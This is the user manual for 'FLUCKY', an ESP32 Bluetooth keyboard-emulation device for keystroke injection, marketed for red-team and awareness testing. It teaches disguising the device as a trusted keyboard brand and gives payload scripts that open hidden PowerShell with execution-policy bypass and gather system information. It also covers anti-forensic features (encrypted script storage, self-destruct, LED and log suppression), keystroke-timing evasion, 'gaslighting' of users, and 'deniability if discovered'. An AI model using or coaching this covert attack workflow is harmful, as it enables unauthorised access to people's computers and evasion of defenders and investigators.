The traditional approach has fundamental limitations. Physical access creates risk. Obvious device behavior invites detection. Simple payloads are predictable. And if you're discovered during the operation, there's no plausible deniability—you're standing there with a suspicious device in your hand.

#### FLUCKY's Approach - The New Way:

```
# Step 1: Be within Bluetooth range (up to 10+ meters)
#         → No physical contact required, operate from safe distance

# Step 2: Automatically appears as available keyboard
#         → Leverages trusted HID device category

# Step 3: [Target connects thinking it's their device] or you connect within 10 sec.
#         → Connection appears legitimate, no suspicion raised

# Step 4: Execute advanced, morphing payloads
#         → Sophisticated techniques that evade detection

# Step 5: Leave no trace, create maximum impact
#         → Clean disconnection, encrypted scripts, self-destruct options
```

This approach transforms HID security testing. Instead of physically approaching a target (risky), you operate from a distance (safe). Instead of hoping you're not noticed (passive), you actively blend in with legitimate devices (active). Instead of simple, detectable payloads (limited), you execute sophisticated, adaptive attacks (powerful). And instead of leaving evidence (careless), you maintain operational security throughout (professional).

---

## 🎯 What Makes FLUCKY Different?

### 1. 🚀 Automatic Bluetooth LE Connectivity

| Feature | Description | Benefit |
|---------|-------------|---------|
| **No manual pairing required** | Appears as standard HID keyboard | Reduces setup complexity, increases reliability |
| **Zero-click connection** | Target simply selects from available devices | Leverages user trust in keyboard devices |
| **Persistent presence** | Stays available until connected | Enables flexible timing of operations |
| **Custom device naming** | Disguise as legitimate peripherals | Blends in with expected devices |

**Technical Implementation Details:**

The Bluetooth Low Energy HID implementation presents the ESP32 as a standard Human Interface Device. This category of devices is inherently trusted—keyboards and mice are expected to be discovered and connected. By appearing in this category, FLUCKY leverages the trust relationship between users and input devices.

The device name is fully customizable, allowing FLUCKY to masquerade as any expected keyboard. Common disguises include "Logitech Keyboard," "Dell Wireless Keyboard," "Microsoft Bluetooth Keyboard," or organization-specific device names. This naming flexibility allows FLUCKY to blend in with the existing peripheral ecosystem of any target environment.

Once powered on, FLUCKY immediately begins advertising as an available HID device. This advertising continues until a connection is established, providing flexibility in when the operation proceeds. The operator can power on the device and wait for the optimal moment, knowing that FLUCKY will be ready when needed.

### 2. 🕶️ True Stealth Operations

| Feature | Description | Operational Impact |
|---------|-------------|-------------------|
| **Complete output suppression** | No serial logs, no LED indicators | Device becomes invisible to visual inspection |
| **Encrypted payload storage** | Scripts remain secure if device captured | Maintains operational security even if compromised |
| **Behavioral obfuscation** | Random delays and execution patterns | Defeats timing-based detection |
| **Self-destruct mechanisms** | Automatic script erasure after use | Prevents forensic analysis of payloads |

**Stealth Layer Architecture:**

FLUCKY implements stealth at multiple levels:

**Visual Stealth:**
When stealth mode is enabled, all visual indicators are suppressed. The LED that normally provides feedback during operation remains dark. Serial output that would log every action is completely disabled. A device in stealth mode gives no external indication that it's operating—the only sign of its presence is the keystrokes being injected into the target system.

**Storage Stealth:**
All scripts stored on FLUCKY can be encrypted using XOR encryption with a user-defined key. If the device is captured during or after an operation, forensic analysis of the device will reveal only encrypted data, not the actual payloads that were used. This protects operational details and prevents captured devices from being reverse-engineered.

**Behavioral Stealth:**
FLUCKY's obfuscation features inject randomness into execution patterns. Jitter adds random delays between commands. Typing obfuscation simulates human typing behavior. These features make FLUCKY's output harder to distinguish from legitimate user input, defeating behavioral analysis that might otherwise detect automated keystroke injection.

**Operational Stealth:**
Self-destruct mechanisms ensure that sensitive payloads can't be accidentally or intentionally reused. When a self-destruct count is reached, all scripts are erased, leaving no trace of what the device was configured to do. This is essential for operations where device capture is a risk.

### 3. 🧠 Psychological Warfare Capabilities

| Feature | Description | Training Value |
|---------|-------------|----------------|
| **Gaslighting features** | Make users question reality | Tests whether users notice subtle anomalies |
| **Chaos mode** | Unpredictable, random script execution | Creates realistic stress-testing scenarios |
| **Advanced obfuscation** | Real-time typing manipulation | Mimics human behavior for realism |
| **Focus disruption** | Steal attention at critical moments | Tests user response to distraction |

**Psychological Operations Philosophy:**

The gaslighting system represents a new frontier in security awareness testing. Traditional training teaches users to recognize obvious threats: suspicious emails, unfamiliar websites, clear security warnings. But sophisticated attackers don't use obvious techniques—they use subtle manipulation that flies under the radar.

The gaslighting features allow security trainers to test whether users notice and respond to subtle system anomalies:

- **GASLIGHT_TYPO:** Simulates realistic typing errors, testing whether users notice when text appears that they didn't type
- **GASLIGHT_CAPS_TOGGLE:** Randomly toggles Caps Lock, testing whether users question unexpected keyboard state changes
- **GASLIGHT_FOCUS_STEAL:** Switches active windows, testing whether users notice when their work environment changes unexpectedly
- **GASLIGHT_NOTIFICATION:** Triggers notification panels, testing response to unexpected system events

These subtle interventions create a training environment where users learn to be attentive to small details, to question unexpected behavior, and to report anomalies rather than dismissing them. This is the type of awareness that protects against sophisticated real-world attacks.

### 4. ⚡ Enterprise-Grade Features

| Feature | Description | Use Case |
|---------|-------------|----------|
| **LOLBAS integration** | Living Off The Land Binary execution | Fileless operations using built-in system tools |
| **Scheduled payloads** | Timed execution for optimal impact | Operations that execute at specific times |
| **Dual trigger system** | Multiple payloads on one device | Flexibility for multi-phase operations |
| **Morphing scripts** | Self-modifying payloads | Evades pattern detection |

**Enterprise Capabilities Explained:**

**LOLBAS Integration:**
Living Off The Land Binaries and Scripts (LOLBAS) is a methodology that uses built-in system tools for offensive operations. Instead of dropping external files that might be detected by antivirus, LOLBAS techniques use trusted system binaries like cmd.exe, powershell.exe, certutil.exe, and reg.exe. FLUCKY provides direct commands for common LOLBAS techniques, making fileless operations straightforward.

**Scheduled Payloads:**
Some operations benefit from delayed execution. Perhaps you want a payload to execute during business hours when activity is expected, or during off-hours when monitoring might be reduced. FLUCKY's scheduling capabilities allow payloads to be configured for future execution, providing flexibility in operational timing.

**Dual Trigger System:**
With two configurable button scripts, FLUCKY can carry multiple payloads. This enables multi-phase operations where different payloads are executed at different times, or backup options if the primary payload doesn't achieve its objective. The dual-button system also provides options for decoy activities—while one button executes the primary operation, the other can create a diversion.

**Morphing Scripts:**
Pattern detection is a common defensive technique—security systems look for repeating patterns that indicate automated behavior. FLUCKY's payload morphing feature randomizes the order of commands within a script, creating a different execution pattern each time. This defeats simple pattern matching and makes FLUCKY's output harder to distinguish from legitimate user activity.

---

## 🔧 Hardware Requirements

### Essential Components

| Component | Description | Notes |
|-----------|-------------|-------|
| **ESP32 Development Board** | Any variant with BLE support | ESP32, ESP32-S3, ESP32-S3 Zero all supported |
| **Micro-USB Cable** | For power and programming | Quality cable essential for reliable flashing |
| **Breadboard/Jumper Wires** | For prototyping | Optional for production use |
| **Enclosure** | For operational deployment | 3D printed or commercial options available |

### ESP32 Variant Comparison

| Variant | Pros | Cons | Best For |
|---------|------|------|----------|
| **ESP32 Original** | Widely available, well-documented | Larger form factor | Development, testing |
| **ESP32-S3** | More powerful, better BLE | Slightly more expensive | Production operations |
| **ESP32-S3 Zero** | Compact form factor | Limited GPIO access | Covert operations |

### GPIO Pin Configuration

| Pin | Function | Mode | Description |
|-----|----------|------|-------------|
| `GPIO 0` | Primary Button | INPUT_PULLUP | Main payload trigger |
| `GPIO 2` | Secondary Button | INPUT_PULLUP | Alternate payload trigger |
| `GPIO 22` | Status LED | OUTPUT | Visual feedback indicator |

**Pin Configuration Details:**

**GPIO 0 (Primary Button):**
This pin is configured with internal pull-up resistor, meaning it reads HIGH when the button is not pressed and LOW when the button is pressed (connecting the pin to ground). The button should be connected between GPIO 0 and GND. When pressed, this button triggers the primary button script defined with `BUTTON_DEF`.

**GPIO 2 (Secondary Button):**
Similar to GPIO 0, this pin uses internal pull-up and triggers the secondary button script defined with `BUTTON2_DEF`. Having two buttons allows for multi-phase operations or decoy activities.

**GPIO 22 (Status LED):**
This output pin drives an LED for visual feedback. The LED should be connected with appropriate current-limiting resistor (typically 220Ω-330Ω) between GPIO 22 and GND. When stealth mode is enabled, this LED is disabled regardless of its configured state.

### Power Considerations

| Power Source | Voltage | Considerations |
|--------------|---------|----------------|
| **USB Power** | 5V via micro-USB | Most common, reliable, continuous power |
| **Battery Power** | 3.3V LiPo | Portable operation, requires charging circuit |
| **External 3.3V** | 3.3V regulated | Custom installations |

**Power Specifications:**

| Parameter | Value | Notes |
|-----------|-------|-------|
| Current Draw (Active) | ~80mA | During active BLE transmission |
| Current Draw (Idle) | ~40mA | While advertising, not connected |
| Current Draw (Stealth) | ~35mA | LED disabled reduces consumption |
| Operating Voltage | 3.0V - 3.6V | ESP32 operating range |
| USB Input | 5V | Regulated to 3.3V on-board |

**Battery Life Estimates:**

| Battery Capacity | Estimated Runtime |
|------------------|-------------------|
| 500mAh LiPo | ~6-8 hours active |
| 1000mAh LiPo | ~12-16 hours active |
| 2000mAh LiPo | ~24-32 hours active |

---

## 🚀 Quick Start Guide

### Step 1: Flashing the Firmware

#### Using esptool.py (Recommended)

```bash
# Install esptool
pip install esptool

# Identify your ESP32's COM port
# Windows: Check Device Manager under Ports (COM & LPT)
# Linux: Check /dev/ttyUSB* or /dev/ttyACM*
# macOS: Check /dev/cu.usbserial-*

# Flash the firmware (replace COM3 with your port)
esptool.py --port COM3 write_flash 0x1000 esp32_s3_flucky_backup.bin

# Verify the flash
esptool.py --port COM3 verify_flash 0x1000 esp32_s3_flucky_backup.bin
```

**Troubleshooting Flash Issues:**

| Issue | Solution |
|-------|----------|
| "Failed to connect" | Hold BOOT button while connecting, release after connection |
| "Wrong boot mode" | Ensure GPIO 0 is HIGH during boot (not pressed) |
| "Timeout" | Try lower baud rate: add `--baud 115200` to command |
| "Invalid header" | Verify correct firmware file for your ESP32 variant |

#### Using Arduino IDE

1. **Install ESP32 Board Support:**
   - Open Arduino IDE
   - Go to File → Preferences
   - Add `https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json` to Additional Boards Manager URLs
   - Go to Tools → Board → Boards Manager
   - Search for "ESP32" and install

2. **Configure for Your Board:**
   - Select correct board variant under Tools → Board
   - Select correct COM port under Tools → Port
   - Set Upload Speed to 115200 (or 921600 for faster upload)

3. **Upload the Binary:**
   - File → Preferences → Show verbose output during upload
   - Sketch → Upload (or use "Upload Using Programmer" for .bin files)

### Step 2: Initial Setup

**Power On Sequence:**
1. Connect ESP32 to power source (USB or battery)
2. LED should blink 3 times indicating successful boot
3. Device immediately begins BLE advertising

**Serial Monitor Connection:**
1. Open Serial Monitor at **115200** baud rate
2. You should see the welcome banner:

```
[CLEAR_SCREEN]
             .
             __
          <(o )___
           ( ._>  /
            `----'`
       ~~~~~~~~~~~~~~~~~
    ~~~~~~~~~~~~~~~~~~~~~~

Welcome to Flucky! Made by James
$ 
```

**Initial Configuration:**
```bash
# Check system status
STATUS

# Rename device for your operation
rename "Logitech Keyboard"

# Verify new name
STATUS
```

### Step 3: Basic Testing

**Test Bluetooth Connectivity:**

```bash
# Check current Bluetooth status
STATUS

# Test disconnect/reconnect cycle
DISCONNECT
DELAY 2000
RECONNECT
```

**Test Basic Keystroke:**

```bash
# Simple text injection
STRING Hello, this is FLUCKY!
ENTER

# Test modifier keys
WIN r
DELAY 500
STRING notepad.exe
ENTER
DELAY 1000
STRING This text was injected by FLUCKY!
```

**Test Button Script:**

```bash
# Define a simple button script
BUTTON_DEF
STRING Button pressed!
ENTER
DELAY 500
STRING This is a test payload.
ENTER
END_BUTTON

# Enable button triggers
ENABLE_BUTTON

# Press GPIO 0 button to execute
```

### Step 4: Your First Complete Script

```bash
# Enter script mode
script
# Paste the following:
DELAY 2000
STRING === FLUCKY Test Script ===
ENTER
DELAY 500
STRING Opening Run dialog...
ENTER
DELAY 500
WIN r
DELAY 500
STRING calc.exe
ENTER
DELAY 1000
STRING Calculator launched successfully!
ENTER
DELAY 500
STRING Test complete.
ENTER
END
```

---

<div align="center">

## 🎮 Core Command System

</div>

### Command Structure

All FLUCKY commands follow a consistent pattern that makes them easy to learn and use:

**Immediate Execution:**
Commands run as soon as they are entered. There is no batch processing or queue—the command executes, and then FLUCKY waits for the next command. This makes behavior predictable and debugging straightforward.

**Case-Sensitive:**
Commands must be entered in uppercase as defined. `STRING` is valid; `string` or `String` will not be recognized. This consistency prevents errors from capitalization mistakes.

**Parameter Support:**
Many commands accept parameters that modify their behavior. Parameters are separated from commands by spaces. For example, `DELAY 1000` uses the DELAY command with parameter 1000 (milliseconds).

**Multi-Command Support:**
Multiple commands can be separated by semicolons for compact scripts: `WIN r; DELAY 500; STRING notepad.exe; ENTER`. This is particularly useful for scheduled commands and one-liners.

---

### Basic Device Management Commands

#### STATUS

**Description:** Comprehensive system status overview showing all current configuration and state.

**Usage:** `STATUS`

**Output Example:**

```
Flucky Status:
  Device Name: Flucky
  Bluetooth: Connected
  Button Trigger: Enabled
  Stealth Mode: Disabled
  Obfuscation: Disabled
  Advanced Obfuscation: Disabled
  Chaos Mode: Disabled
  Jitter: Disabled
  XOR Key: [Not Set]
  Button Script: [Not Defined]
  Button2 Script: [Not Defined]
  Easter Egg: [Not Hidden]
  Scheduled Payload: [Not Scheduled]
  Self-Destruct: Disabled
  Gaslight Profile: [Not Defined]
  Gaslight Active: No
```

**When to Use:**
- Before operations to verify configuration
- After configuration changes to confirm settings
- During troubleshooting to identify issues
- After flashing to verify successful initialization

#### rename \<name\>

**Description:** Change the Bluetooth device name that appears when FLUCKY advertises.

**Usage:** `rename <name>`

**Parameters:**
- `<name>`: New device name (1-256 characters)

**Examples:**

```bash
# Corporate environment disguise
rename "Logitech MX Keys"

# Generic disguise
rename "Bluetooth Keyboard"

# Organization-specific disguise
rename "ACME Corp Keyboard"
```

**Effect:** Immediately reinitializes BLE advertising with the new name. Devices that have previously seen FLUCKY may cache the old name, so target devices may need to "forget" the device and re-discover it.

**Best Practices:**
- Choose names that would be expected in the target environment
- Match naming conventions of legitimate devices
- Avoid suspicious names like "Hacker Keyboard" or "Pwn Device"
- Consider the organization's IT naming conventions

#### clear

**Description:** Clear the serial terminal screen and re-display the welcome banner.

**Usage:** `clear`

**Effect:** Clears all previous output from the terminal and shows a fresh welcome message. Useful for maintaining a clean workspace during extended sessions.

#### help

**Description:** Display a comprehensive list of all available commands with brief descriptions.

**Usage:** `help`

**When to Use:**
- When you forget a command syntax
- To discover new commands
- As a quick reference during operations

---

### Script Management System

#### Interactive Script Modes

FLUCKY provides multiple ways to define and execute scripts, each suited to different use cases.

##### script - Multi-line Script Input

**Description:** Enter interactive mode for defining and immediately executing multi-line scripts.

**Usage:**
```bash
script
<command 1>
<command 2>
...
END
```

**Example:**

```bash
$ script
Paste your script below. Send 'END' on a new line to finish:
------------------------
STRING Starting attack sequence
DELAY 1000
WIN r
DELAY 500
STRING cmd.exe
ENTER
DELAY 1000
STRING whoami
ENTER
END
------------------------
Executing script...
> STRING Starting attack sequence
> DELAY 1000
> WIN r
> DELAY 500
> STRING cmd.exe
> ENTER
> DELAY 1000
> STRING whoami
> ENTER
Script execution completed
```

**When to Use:**
- Testing new scripts before committing to button scripts
- One-time operations that don't need to be saved
- Development and debugging of scripts

##### BUTTON_DEF - Primary Button Script

**Description:** Define the script that executes when GPIO 0 button is pressed.

**Usage:**
```bash
BUTTON_DEF
<commands>
END_BUTTON
```

**Example:**

```bash
$ BUTTON_DEF
Paste your button script below. Send 'END_BUTTON' on a new line to finish:
------------------------
STEALTH_ON
DELAY 2000
WIN r
STRING powershell -WindowStyle Hidden -Command "Start-Process cmd -WindowStyle Hidden"
ENTER
DELAY 3000
STRING systeminfo
ENTER
STEALTH_OFF
END_BUTTON
------------------------
Button script defined
```

**Important Notes:**
- Button script persists until overwritten or device reset
- Script is encrypted if XOR key is set
- Button must be enabled with `ENABLE_BUTTON` to function
- Long scripts may take a moment to store

##### BUTTON2_DEF - Secondary Button Script

**Description:** Define the script that executes when GPIO 2 button is pressed.

**Usage:**
```bash
BUTTON2_DEF
<commands>
END_BUTTON2
```

**Example:**

```bash
$ BUTTON2_DEF
Paste your second button script below. Send 'END_BUTTON2' on a new line to finish:
------------------------
STRING This is the secondary payload!
ENTER
DELAY 1000
STRING executed at [TIME]
ENTER
END_BUTTON2
------------------------
Second button script defined
```

**Use Cases for Secondary Button:**
- Backup payload if primary fails
- Decoy activity while primary executes
- Different phase of multi-stage operation
- Quick reconnaissance vs. full exploitation

---

### Bluetooth Management

#### DISCONNECT

**Description:** Immediately terminate the Bluetooth connection and stop advertising.

**Usage:** `DISCONNECT`

**Effect:**
- Ends BLE advertising
- Cleans up Bluetooth stack
- Sets device to disconnected state
- LED blinks 3 times for confirmation

**When to Use:**
- Before changing device name (to force re-advertising)
- When connection becomes unstable
- To end an operation cleanly
- Before transport to prevent accidental connection

#### RECONNECT

**Description:** Reinitialize Bluetooth connectivity with current device name.

**Usage:** `RECONNECT`

**Effect:**
- Calls DISCONNECT internally
- Reinitializes BLE with current device name
- Begins advertising immediately
- LED blinks 3 times for confirmation

**When to Use:**
- After DISCONNECT to restore functionality
- When Bluetooth seems frozen or unresponsive
- After changing device name to apply changes
- When target device can't find FLUCKY

---

### ⌨️ Basic Keystroke Injection

FLUCKY provides comprehensive keystroke injection capabilities that cover the full range of keyboard input.

#### Single Key Presses

| Command | Equivalent | Description |
|---------|------------|-------------|
| `ENTER` | KEY_RETURN | Press Enter key |
| `SPACE` | ' ' (space) | Press Space bar |
| `TAB` | KEY_TAB | Press Tab key |
| `ESC` / `ESCAPE` | KEY_ESC | Press Escape key |
| `BREAK` / `PAUSE` | KEY_MEDIA_PLAY_PAUSE | Press Break/Pause key |
| `INSERT` | KEY_INSERT | Press Insert key |
| `DELETE` | KEY_DELETE | Press Delete key |
| `BACKSPACE` | KEY_BACKSPACE | Press Backspace key |

**Usage Examples:**

```bash
# Simple navigation
ENTER
TAB
TAB
ENTER

# Cancel an operation
ESC

# Delete selected text
DELETE

# Go back in a form
BACKSPACE
```

#### Modifier Key Combinations

##### WIN / META

**Description:** Press Windows key (Windows) or Meta/Command key (macOS/Linux).

**Usage:**
- `WIN` - Press Windows key alone (opens Start Menu)
- `WIN <key>` - Windows + key combination

**Examples:**

| Command | Effect |
|---------|--------|
| `WIN` | Open Start Menu |
| `WIN r` | Open Run dialog |
| `WIN d` | Show desktop |
| `WIN l` | Lock workstation |
| `WIN e` | Open File Explorer |
| `WIN i` | Open Settings |

##### CTRL \<key\>

**Description:** Control key combination.

**Usage:** `CTRL <key>`

**Examples:**

| Command | Effect |
|---------|--------|
| `CTRL c` | Copy selected text |
| `CTRL v` | Paste clipboard content |
| `CTRL a` | Select all content |
| `CTRL z` | Undo last action |
| `CTRL x` | Cut selected text |
| `CTRL s` | Save current file |
| `CTRL p` | Print |
| `CTRL f` | Find |
| `CTRL w` | Close current tab |
| `CTRL t` | New tab |

##### ALT \<key\>

**Description:** Alt key combination.

**Usage:** `ALT <key>`

**Examples:**

| Command | Effect |
|---------|--------|
| `ALT tab` | Switch between applications |
| `ALT f4` | Close current window |
| `ALT space` | Open window menu |
| `ALT enter` | Properties (in Explorer) |
| `ALT left` | Back in browser |
| `ALT right` | Forward in browser |

##### SHIFT \<key\>

**Description:** Shift key combination.

**Usage:** `SHIFT <key>`

**Effect:** Produces uppercase character or symbol (the shifted version of the key).

**Examples:**

| Command | Effect |
|---------|--------|
| `SHIFT a` | Types 'A' |
| `SHIFT 1` | Types '!' |
| `SHIFT 9` | Types '(' |
| `SHIFT tab` | Navigate backward |

##### CTRL ALT DELETE

**Description:** Three-key security combination.

**Usage:** `CTRL ALT DELETE`

**Effect:** Opens security options screen (Windows) or similar secure attention sequence on other operating systems.

**Important Note:** This combination is often handled specially by operating systems and may not be injectable on all systems or configurations.

#### Navigation Keys

##### Arrow Keys

| Command | Description |
|---------|-------------|
| `UPARROW` | Press Up arrow key |
| `DOWNARROW` | Press Down arrow key |
| `LEFTARROW` | Press Left arrow key |
| `RIGHTARROW` | Press Right arrow key |

**Usage Example:**

```bash
# Navigate a menu
UPARROW
UPARROW
ENTER

# Move cursor in text
LEFTARROW
LEFTARROW
DELETE
```

##### Document Navigation

| Command | Description |
|---------|-------------|
| `HOME` | Press Home key (beginning of line) |
| `END` | Press End key (end of line) |
| `PAGEUP` | Press Page Up key |
| `PAGEDOWN` | Press Page Down key |

**Usage Example:**

```bash
# Go to beginning of line
HOME
SHIFT END    # Select to end of line
CTRL c       # Copy line

# Navigate document
PAGEDOWN
PAGEDOWN
```

#### Function Keys

| Command | Common Use |
|---------|------------|
| `F1` | Help in most applications |
| `F2` | Rename selected file |
| `F3` | Search |
| `F4` | Address bar (Explorer) |
| `F5` | Refresh page / Run code |
| `F6` | Address bar (browser) |
| `F7` | Spelling check |
| `F8` | Safe mode (boot) |
| `F9` | Refresh fields |
| `F10` | Activate menu bar |
| `F11` | Toggle fullscreen |
| `F12` | Developer tools / Save As |

**Usage Example:**

```bash
# Refresh browser page
F5

# Open developer tools
F12

# Toggle fullscreen
F11
```

#### Media Control Keys

| Command | Description |
|---------|-------------|
| `VOLUMEUP` | Increase system volume |
| `VOLUMEDOWN` | Decrease system volume |
| `MUTE` | Toggle audio mute |
| `PLAY` / `PAUSE` | Toggle media playback |
| `NEXTTRACK` | Skip to next track |
| `PREVTRACK` | Return to previous track |

**Usage Example:**

```bash
# Volume control
VOLUMEUP
VOLUMEUP
VOLUMEUP

# Mute audio
MUTE

# Media control
PLAY
NEXTTRACK
```

#### String Input

##### STRING \<text\>

**Description:** Type arbitrary text strings character by character.

**Usage:** `STRING <text>`

**Parameters:**
- `<text>`: Any text up to 256 characters per command

**Features:**
- Supports full ASCII character set (32-126)
- Batch processing in 10-character chunks
- Configurable inter-character delays
- Advanced obfuscation compatibility
- Automatic non-ASCII character filtering

**Examples:**

```bash
# Basic text
STRING Hello World!

# File paths
STRING C:\Windows\System32\calc.exe

# Commands
STRING powershell -Command "Get-Process"

# URLs
STRING https://example.com/path?param=value

# Code
STRING function test() { return true; }
```

**Handling Long Strings:**
For strings longer than 256 characters, split across multiple STRING commands:

```bash
STRING This is a very long string that exceeds the 256 character limit. Part 1...
STRING ...and this is part 2 of the same long string continued.
STRING ...and this is the final part 3.
```

#### Single Character Keys

**Description:** Press any single character key.

**Usage:** `<character>` (single ASCII character)

**Examples:**

| Command | Effect |
|---------|--------|
| `a` | Press 'a' key |
| `A` | Press 'A' key (Shift+a) |
| `1` | Press '1' key |
| `@` | Press '@' symbol |
| `!` | Press '!' symbol |

**Restrictions:** Single ASCII character only (32-126).

---

<div align="center">

# Part 2: Stealth, Encryption & Advanced Operations

<img src="https://img.shields.io/badge/Feature-Stealth-green?style=flat-square" alt="Stealth">
<img src="https://img.shields.io/badge/Feature-Encryption-orange?style=flat-square" alt="Encryption">
<img src="https://img.shields.io/badge/Feature-Obfuscation-purple?style=flat-square" alt="Obfuscation">

### Become a Ghost in the Machine - Advanced Stealth and Evasion Techniques

*"The best attack is one they never detect"*

</div>

---

## 🕶️ Stealth Operations

### Complete Operational Security

FLUCKY's stealth capabilities transform your device from a visible tool into an invisible research instrument. When stealth matters, FLUCKY delivers comprehensive invisibility.

#### STEALTH_ON

**Description:** Enable complete stealth mode.

**Usage:** `STEALTH_ON`

**Effects:**

| Feature | Status |
|---------|--------|
| Serial output | ✅ Completely disabled |
| LED indicators | ✅ Turned off |
| Visual feedback | ✅ None |
| Command execution | ✅ Continues normally |
| Bluetooth functionality | ✅ Fully maintained |

**Operational Impact:**
- Device becomes completely invisible to visual inspection
- No logging of activities on serial monitor
- Perfect for covert operations and physical security testing
- Maintains full Bluetooth functionality

**Best Practices:**
- Enable stealth before sensitive operations
- Verify stealth is working by checking for LED activity
- Remember that stealth also disables your ability to see what's happening
- Plan your operations so you can execute without visual feedback

#### STEALTH_OFF

**Description:** Disable stealth mode.

**Usage:** `STEALTH_OFF`

**Effects:**

| Feature | Status |
|---------|--------|
| Serial output | ✅ Re-enabled |
| LED indicators | ✅ Reactivated |
| Normal visual feedback | ✅ Restored |
| LED confirmation | ✅ Blinks twice |

### Stealth Operation Examples

#### Corporate Red Team Operation

```bash
# Enable stealth for covert operation
STEALTH_ON

BUTTON_DEF
DELAY 3000
WIN r
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\temp\recon.ps1
ENTER
END_BUTTON

# Device now operates completely silently
# No visible indicators when buttons pressed
```

#### Physical Security Assessment

```bash
STEALTH_ON
# Device placed in target area
# No visual indicators when buttons pressed
# Complete deniability if discovered

# Later, when recovered in safe location:
STEALTH_OFF
STATUS  # Verify operation completed
```

### Real-World Stealth Scenarios

**Corporate Red Team:**
When conducting authorized red team assessments, stealth is essential for realistic testing. A device that flashes LEDs or shows serial output isn't testing whether defenders would notice a real attack—it's testing whether they notice obvious indicators. STEALTH_ON ensures that the only evidence of FLUCKY's presence is the keystrokes it injects.

**Physical Security Assessment:**
In physical security testing, devices may need to be placed in target environments and left to operate. STEALTH_ON ensures that if the device is discovered by cleaning staff, security personnel, or employees, there are no suspicious lights or outputs that would identify it as a testing device. This provides operational cover and prevents premature discovery.

**Awareness Training:**
When testing whether users notice subtle anomalies, the testing device itself should be invisible. Users shouldn't see a suspicious device with blinking lights—they should only experience the system behavior changes that the test is meant to evaluate. STEALTH_ON enables this type of realistic testing.

---

## 🔐 Encryption & Security

### Military-Grade Payload Protection

FLUCKY's encryption system ensures your payloads remain secure even if the device is captured or analyzed. This is essential for maintaining operational security throughout the assessment lifecycle.

#### SET_XOR_KEY \<key\>

**Description:** Set XOR encryption key for all scripts.

**Usage:** `SET_XOR_KEY <key>`

**Parameters:**
- `<key>`: Encryption key (1-256 characters)

**Effects:**

| Script Type | Protection |
|-------------|------------|
| Button scripts | ✅ Automatically encrypted |
| Secondary button scripts | ✅ Automatically encrypted |
| Easter egg scripts | ✅ Automatically encrypted |
| Scheduled payloads | ✅ Automatically encrypted |
| Gaslight profiles | ✅ Automatically encrypted |

**Technical Details:**

| Parameter | Value |
|-----------|-------|
| Algorithm | XOR cipher with key cycling |
| Key Space | 256-bit effective with long keys |
| Performance | Minimal overhead on ESP32 |
| Security | Obfuscation against casual analysis |

**Usage Example:**

```bash
# Set encryption key
SET_XOR_KEY CorporateRedTeam2024!

# Define encrypted script
BUTTON_DEF
STRING Encrypted payload content
ENTER
DELAY 1000
WIN r
STRING notepad.exe
ENTER
END_BUTTON

# Script is now stored encrypted on device
```

### Encryption Management

#### View Encryption Status

```bash
STATUS
# Look for: XOR Key: [Set]
```

#### Change Encryption Key

```bash
# Old key: OldPassword123
# New key: NewPassword456
SET_XOR_KEY NewPassword456
# All scripts automatically re-encrypted
```

#### Remove Encryption (Not Recommended)

```bash
# Set to empty key
SET_XOR_KEY

# Warning: This will store scripts in plaintext!
# Not recommended for operational security
```

### Self-Destruct Mechanisms

#### SELF_DESTRUCT \<count\>

**Description:** Erase all scripts after specified number of executions.

**Usage:** `SELF_DESTRUCT <count>`

**Parameters:**
- `<count>`: Positive integer (number of executions before erase)

**Effects:**

| Action | Details |
|--------|---------|
| Counts script executions | Tracks how many times scripts run |
| Erases ALL scripts when limit reached | Button scripts, Easter eggs, Scheduled payloads, Gaslight profiles |
| Resets destruction counter | After erasure, counter starts fresh |
| LED confirmation | Blinks 5 times when triggered |

**Operational Security Examples:**

**One-Time Mission:**
```bash
# Mission with limited access
SELF_DESTRUCT 1
BUTTON_DEF
STRING One-time intelligence gathering
ENTER
DELAY 2000
STRING systeminfo > C:\temp\sysinfo.txt
ENTER
END_BUTTON
# Script erases itself after first use
```

**Training Environment:**
```bash
SELF_DESTRUCT 5
# Perfect for training - prevents accidental reuse
# of sensitive payloads in wrong environments
```

**Multi-Phase Operation:**
```bash
SELF_DESTRUCT 3
BUTTON_DEF
STRING Phase 1: Initial reconnaissance
ENTER
DELAY 1000
STRING Phase 2: Data gathering
ENTER
END_BUTTON
# Allows 3 executions before erasing
```

---

## 🎭 Obfuscation & Evasion

FLUCKY provides multiple layers of obfuscation to make keystroke injection harder to detect and analyze.

### Basic Keystroke Obfuscation

#### OBFUSCATE_ON

**Description:** Enable basic keystroke obfuscation.

**Usage:** `OBFUSCATE_ON`

**Effects:**

| Feature | Probability |
|---------|-------------|
| Random extra keystrokes | 33% per batch |
| CAPS LOCK toggling | Random intervals |
| ALT key presses | Random insertion |
| TAB key injections | During typing |

**Technical Implementation:**
- 33% chance of obfuscation per keystroke batch
- Random selection from 3 obfuscation methods
- Minimal impact on payload execution time
- Maintains payload functionality

#### OBFUSCATE_OFF

**Description:** Disable basic keystroke obfuscation.

**Usage:** `OBFUSCATE_OFF`

**Effect:** Clean, predictable keystroke injection.

### Advanced Behavioral Obfuscation

#### ADV_OBFUSCATE_ON

**Description:** Enable advanced typing obfuscation that mimics human behavior.

**Usage:** `ADV_OBFUSCATE_ON`

**Effects:**

| Technique | Description |
|-----------|-------------|
| Character Flooding | Insert 1-3 random characters then delete them |
| Cursor Jumping | Move cursor to random positions in text |
| Multi-direction Editing | Simulate real human typing errors |
| Context-aware | Maintains overall payload integrity |

**Technical Details:**
- 20% chance per character for advanced obfuscation
- Randomly inserts and deletes characters
- Uses HOME/END keys to jump within text
- Simulates backspace/delete for corrections

#### ADV_OBFUSCATE_OFF

**Description:** Disable advanced obfuscation.

**Usage:** `ADV_OBFUSCATE_OFF`

### Obfuscation Strategy Examples

#### Basic Obfuscation for General Use

```bash
OBFUSCATE_ON
STRING This text will have random keystrokes injected
ENTER
```

#### Advanced Obfuscation for High-Security Environments

```bash
ADV_OBFUSCATE_ON
STRING This text will appear to be typed by a human with erratic behavior
ENTER
```

#### Combined Obfuscation Layers

```bash
OBFUSCATE_ON
ADV_OBFUSCATE_ON
STRING Maximum obfuscation - both basic and advanced techniques active
ENTER
```

#### Operational Configuration

```bash
# Configure for realistic operation
SET_JITTER 500
JITTER_ON
OBFUSCATE_ON
ADV_OBFUSCATE_ON

BUTTON_DEF
STRING This script will appear completely human
ENTER
DELAY 1000
STRING with random timing and typing patterns
ENTER
END_BUTTON
```

---

## ⏰ Timing & Scheduling

### Delay Management

#### DELAY \<ms\>

**Description:** Insert specific delay in milliseconds.

